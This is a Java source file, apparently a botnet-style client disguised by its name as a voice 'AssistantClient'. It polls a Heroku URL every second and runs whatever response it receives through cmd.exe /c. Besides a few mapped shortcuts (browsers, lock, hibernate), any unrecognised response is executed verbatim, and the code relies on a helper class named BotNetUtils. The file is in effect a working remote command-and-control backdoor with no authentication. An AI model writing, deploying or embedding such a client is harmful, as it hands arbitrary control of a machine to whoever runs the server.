import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;
import java.util.Scanner;

public class AssistantClient {
    private static final String PATH = "https://voice-assistant-server.herokuapp.com/commands/pool-first-commands";
    public static void main(String[] args) {
        System.out.println("Starting Assistant client");
        while (true) {
            String response = BotNetUtils.httpsGETRequest(PATH);
            if (!response.isEmpty()) {
                System.out.println("Starting running command : " + response);
                excCommand(parseCommand(response));
            }
            try {
                Thread.sleep(1000);
            } catch (InterruptedException e) {
                throw new RuntimeException(e);
            }
        }
    }

    public static String parseCommand(String response) {
        if (response.equals("/firefox")) {
            return "start firefox";
        }
        if (response.startsWith("/firefox")) {
            String[] split = response.split("/firefox", 2);
            return "start firefox" + split[1];
        }
        if (response.equals("/chrome")) {
            return "start chrome";
        }
        if (response.startsWith("/chrome")) {
            String[] split = response.split("/chrome", 2);
            return "start chrome" + split[1];
        }
        if (response.startsWith("/lock")) {
            return "rundll32.exe user32.dll,LockWorkStation";
        }
        if (response.startsWith("/unlock")) {
            return "rundll32.exe user32.dll,UnlockWorkStation";
        }
        if (response.startsWith("/hibernate")) {
            return "Rundll32.exe powrprof.dll,SetSuspendState";
        }
        return response;
    }

    public static void excCommand(String command){
        Runtime rt = Runtime.getRuntime();
        try {
            System.out.println("executing command : " + command + "|");
            rt.exec(new String[]{"cmd.exe","/c",command});

        } catch (IOException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
    }
}
